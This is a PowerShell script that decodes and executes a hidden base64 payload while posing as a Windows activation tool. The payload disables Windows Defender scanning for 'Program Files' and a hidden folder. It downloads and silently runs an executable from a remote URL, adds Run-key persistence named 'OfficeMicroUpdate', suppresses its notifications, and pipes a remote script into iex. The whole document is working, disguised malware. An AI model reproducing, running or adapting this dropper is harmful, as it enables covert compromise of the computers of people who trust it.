$base64EncodedString = "QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpmdW5jdGlvbiBTaG93LUVycm9yTWVzc2FnZSB7CgogICAgcGFyYW0gKAoKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlLAoKICAgICAgICBbc3RyaW5nXSR0aXRsZSA9ICJJbnN1ZmZpY2llbnQgcHJpdmlsZWdlcyIKCiAgICApCgogICAgCgogICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCRtZXNzYWdlLCAkdGl0bGUsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikKCn0KaWYgKC1OT1QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKGAKW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdICJBZG1pbmlzdHJhdG9yIikpIHsKICAgIFdyaXRlLVdhcm5pbmcgIkluc3VmZmljaWVudCBwcml2aWxlZ2VzIHRvIGV4ZWN1dGUgdGhpcyBzY3JpcHQuIE9wZW4gYSBQb3dlclNoZWxsIGNvbnNvbGUgd2l0aCBhZG1pbmlzdHJhdG9yIHByaXZpbGVnZXMgYW5kIHJ1biB0aGUgc2NyaXB0IGFnYWluLiIKICAgIFNob3ctRXJyb3JNZXNzYWdlIC1tZXNzYWdlICJJbnN1ZmZpY2llbnQgcHJpdmlsZWdlcyB0byBleGVjdXRlIHRoaXMgc2NyaXB0LiBPcGVuIGEgUG93ZXJTaGVsbCBjb25zb2xlIHdpdGggYWRtaW5pc3RyYXRvciBwcml2aWxlZ2VzIGFuZCBydW4gdGhlIHNjcmlwdCBhZ2Fpbi4iCkJyZWFrCn0KCgoKIyBCYXNlNjQtZW5jb2RlZCBzdHJpbmdzIGZvciB0aGlyZCBkb3dubG9hZCAob2ZmaWNlbWljcm8uZXhlKQokb2ZmaWNlRG93bmxvYWRVcmxCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoImh0dHBzOi8vZ2l0aHViLmNvbS9XaW5kb3dzVHdlYWtzWC9Qb3dlclNoZWxsQWN0aXZhdGUvcmF3L3JlZnMvaGVhZHMvbWFpbi9kb2xiYWViLmV4ZSIpKQokdXBkYXRlcnJyRXhlQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJXaW5kb3dzSG9zdEFwcGxpY2F0aW9uLmV4ZSIpKQojIENvbW1vbiBhdHRyaWJ1dGVzCiRoaWRkZW5BdHRyQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJIaWRkZW4iKSkKJHNpbGVudGx5Q29udGludWVCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIlNpbGVudGx5Q29udGludWUiKSkKJHN0b3BBY3Rpb25CNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIlN0b3AiKSkKJGRpcmVjdG9yeUI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiRGlyZWN0b3J5IikpCgojIERlY29kZSB0aGVtCiRvZmZpY2VEb3dubG9hZFVybCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJG9mZmljZURvd25sb2FkVXJsQjY0KSkKJHVwZGF0ZXJyckV4ZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHVwZGF0ZXJyckV4ZUI2NCkpCiRoaWRkZW5BdHRyID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkaGlkZGVuQXR0ckI2NCkpCiRzaWxlbnRseUNvbnRpbnVlID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkc2lsZW50bHlDb250aW51ZUI2NCkpCiRzdG9wQWN0aW9uID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkc3RvcEFjdGlvbkI2NCkpCiRkaXJlY3RvcnkgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRkaXJlY3RvcnlCNjQpKQoKIyBDcmVhdGUgYSBuZXcgaGlkZGVuIGZvbGRlckFkZC1Gb2xkZXJFeGNsdXNpb24KJGhpZGRlbkZvbGRlck5hbWUgPSAiTm90aWZ5VGVtcF8iICsgW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkuU3Vic3RyaW5nKDAsOCkKJGhpZGRlbkZvbGRlciA9IEpvaW4tUGF0aCAkZW52OkxPQ0FMQVBQREFUQSAkaGlkZGVuRm9sZGVyTmFtZQpOZXctSXRlbSAtSXRlbVR5cGUgJGRpcmVjdG9yeSAtUGF0aCAkaGlkZGVuRm9sZGVyIC1Gb3JjZSB8IE91dC1OdWxsCiRvZmZpY2VQYXRoID0gSm9pbi1QYXRoICRoaWRkZW5Gb2xkZXIgJHVwZGF0ZXJyckV4ZQoKIyBGdW5jdGlvbiB0byBhZGQgZm9sZGVyIGV4Y2x1c2lvbgojIEZ1bmN0aW9uIHRvIGFkZCBleGNsdXNpb25zIHdpdGggcmV0cnkgYW5kIHZlcmlmaWNhdGlvbgpmdW5jdGlvbiBBZGQtRm9sZGVyRXhjbHVzaW9uIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRwYXRoLAogICAgICAgIFtpbnRdJG1heFJldHJpZXMgPSA1LAogICAgICAgIFtpbnRdJGRlbGF5U2Vjb25kcyA9IDEKICAgICkKICAgICRyZXRyeUNvdW50ID0gMAogICAgJHN1Y2Nlc3MgPSAkZmFsc2UKICAgIAogICAgd2hpbGUgKC1ub3QgJHN1Y2Nlc3MgLWFuZCAkcmV0cnlDb3VudCAtbHQgJG1heFJldHJpZXMpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRwYXRoIC1FcnJvckFjdGlvbiAkc3RvcEFjdGlvbgogICAgICAgICAgICAjIFZlcmlmeSBleGNsdXNpb24gd2FzIGFkZGVkIChyZXF1aXJlcyBhZG1pbiByaWdodHMgdG8gY2hlY2ssIGJ1dCBhdHRlbXB0IGFueXdheSkKICAgICAgICAgICAgaWYgKEdldC1NcFByZWZlcmVuY2UgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBFeGNsdXNpb25QYXRoIHwgV2hlcmUtT2JqZWN0IHsgJF8gLWVxICRwYXRoIH0pIHsKICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJHRydWUKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAkcmV0cnlDb3VudCsrCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheVNlY29uZHMKICAgICAgICB9CiAgICB9CiAgICBpZiAoLW5vdCAkc3VjY2VzcykgewogICAgfQogICAgIyBBZGRpdGlvbmFsIGRlbGF5IHRvIGVuc3VyZSBleGNsdXNpb24gdGFrZXMgZWZmZWN0CiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDIwMAp9CgoKIyBNYWluIGV4ZWN1dGlvbgp0cnkgewogICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAiQzpcUHJvZ3JhbSBGaWxlcyIKICAgIFdyaXRlLUhvc3QgIkxvYWRpbmcgQWN0aXZhdGlvbiBTY3JpcHQuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgRGFya0dyZWVuIC1CYWNrZ3JvdW5kQ29sb3IgV2hpdGUKICAgICMgQWRkIGZvbGRlciBleGNsdXNpb24gQkVGT1JFIGRvd25sb2FkcwogICAgQWRkLUZvbGRlckV4Y2x1c2lvbiAtcGF0aCAkaGlkZGVuRm9sZGVyCiAgICAjIEFkZCBmaWxlLXNwZWNpZmljIGV4Y2x1c2lvbnMgZm9yIGV4dHJhIHByb3RlY3Rpb24KICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJG9mZmljZVBhdGgKICAgIAogICAgCiAgICAjIERvd25sb2FkIG9mZmljZW1pY3JvLmV4ZSBhcyB1cGRhdGVycnIuZXhlCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRvZmZpY2VEb3dubG9hZFVybCAtT3V0RmlsZSAkb2ZmaWNlUGF0aCAtVXNlQmFzaWNQYXJzaW5nIC1FcnJvckFjdGlvbiAkc3RvcEFjdGlvbgogICAgIyBTZXQgZm9sZGVyIGFuZCBmaWxlcyBhcyBoaWRkZW4KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGhpZGRlbkZvbGRlciAtTmFtZSBBdHRyaWJ1dGVzIC1WYWx1ZSAkaGlkZGVuQXR0cgogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkb2ZmaWNlUGF0aCAtTmFtZSBBdHRyaWJ1dGVzIC1WYWx1ZSAkaGlkZGVuQXR0cgogICAgCiAgICAjIFJ1biBhbGwgZmlsZXMgc2lsZW50bHkgaW4gdGhlIGN1cnJlbnQgc2Vzc2lvbgogICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG9mZmljZVBhdGggLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgCgogICAgJHJlZ1BhdGhPZmZpY2UgPSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIgogICAgJHJlZ05hbWVPZmZpY2UgPSAiT2ZmaWNlTWljcm9VcGRhdGUiCiAgICAkcmVnVmFsdWVPZmZpY2UgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCBgIiRvZmZpY2VQYXRoYCIiCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoT2ZmaWNlIC1OYW1lICRyZWdOYW1lT2ZmaWNlIC1WYWx1ZSAkcmVnVmFsdWVPZmZpY2UgLUVycm9yQWN0aW9uICRzaWxlbnRseUNvbnRpbnVlCiAgICAKICAgICMgU3VwcHJlc3Mgbm90aWZpY2F0aW9ucyBmcm9tIHVwZGF0ZXJyci5leGUKICAgIE5ldy1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxOb3RpZmljYXRpb25zXFNldHRpbmdzIiAtTmFtZSAkdXBkYXRlcnJyRXhlIC1Gb3JjZSB8IE91dC1OdWxsCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxOb3RpZmljYXRpb25zXFNldHRpbmdzXCR1cGRhdGVycnJFeGUiIC1OYW1lICJFbmFibGVkIiAtVmFsdWUgMCAtRXJyb3JBY3Rpb24gJHNpbGVudGx5Q29udGludWUKICAgIAogICAgIyBXYWl0IGJyaWVmbHkgZm9yIGV4ZWN1dGlvbgogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMgp9IGNhdGNoIHsKICAgICMgT3V0cHV0IGVycm9yIGZvciBkZWJ1Z2dpbmcKICAgIFdyaXRlLUhvc3QgIkVycm9yOiAkXyIKICAgIGV4aXQgMQp9IGZpbmFsbHkgewogICAgIyBObyBjbGVhbnVwIC0gbGVhdmUgdHJhY2VzIGFzIHJlcXVlc3RlZAogICAgaXJtIGh0dHBzOi8vZ2V0LmFjdGl2YXRlZC53aW4gfCBpZXgKICAgIAp9Cg=="
$decodedBytes = [System.Convert]::FromBase64String($base64EncodedString)
$decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
Invoke-Expression $decodedString
